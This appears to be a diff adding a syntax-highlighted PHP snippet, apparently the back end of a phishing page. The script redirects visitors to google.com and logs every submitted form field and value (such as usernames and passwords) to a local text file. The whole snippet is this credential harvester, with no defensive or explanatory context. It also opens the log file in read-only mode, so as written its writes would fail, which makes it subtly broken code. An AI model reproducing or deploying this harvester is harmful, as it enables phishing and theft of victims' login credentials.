@@ -1,0 +1,17 @@
+<pre>
+<span style="font-family: Consolas">
+<span style="color: #800000">&lt;?php</span>
+<span style="color: #ff0000">header </span><span style="color: #800000">(</span><span style="color: #ff00ff">'Location:https://google.com/'</span><span style="color: #800000">);</span>
+<span style="color: #0000ff">$</span><span style="color: #008080">handle </span><span style="color: #800000">= </span><span style="color: #ff0000">fopen</span><span style="color: #800000">(</span><span style="color: #ff00ff">&quot;C:\Users\Tunguz\Desktop\Nova fascikla\ccc.txt&quot;</span><span style="color: #800000">, </span><span style="color: #ff00ff">&quot;r&quot;</span><span style="color: #800000">);</span>
+<span style="color: #0000ff">foreach</span><span style="color: #800000">(</span><span style="color: #0000ff">$</span><span style="color: #008080">_POST </span><span style="color: #0000ff">as $</span><span style="color: #008080">variable </span><span style="color: #800000">=&gt; </span><span style="color: #0000ff">$</span><span style="color: #008080">value</span><span style="color: #800000">) {</span>
+   <span style="color: #ff0000">fwrite</span><span style="color: #800000">(</span><span style="color: #0000ff">$</span><span style="color: #008080">handle</span><span style="color: #800000">, </span><span style="color: #0000ff">$</span><span style="color: #008080">variable</span><span style="color: #800000">);</span>
+   <span style="color: #ff0000">fwrite</span><span style="color: #800000">(</span><span style="color: #0000ff">$</span><span style="color: #008080">handle</span><span style="color: #800000">, </span><span style="color: #ff00ff">&quot;=&quot;</span><span style="color: #800000">);</span>
+   <span style="color: #ff0000">fwrite</span><span style="color: #800000">(</span><span style="color: #0000ff">$</span><span style="color: #008080">handle</span><span style="color: #800000">, </span><span style="color: #0000ff">$</span><span style="color: #008080">value</span><span style="color: #800000">);</span>
+   <span style="color: #ff0000">fwrite</span><span style="color: #800000">(</span><span style="color: #0000ff">$</span><span style="color: #008080">handle</span><span style="color: #800000">, </span><span style="color: #ff00ff">&quot;\r\n&quot;</span><span style="color: #800000">);</span>
+<span style="color: #800000">}</span>
+<span style="color: #ff0000">fwrite</span><span style="color: #800000">(</span><span style="color: #0000ff">$</span><span style="color: #008080">handle</span><span style="color: #800000">, </span><span style="color: #ff00ff">&quot;\r\n&quot;</span><span style="color: #800000">);</span>
+<span style="color: #ff0000">fclose</span><span style="color: #800000">(</span><span style="color: #0000ff">$</span><span style="color: #008080">handle</span><span style="color: #800000">);</span>
+<span style="color: #0000ff">exit</span><span style="color: #800000">;</span>
+<span style="color: #800000">?&gt;</span>
+</span>
+</pre>
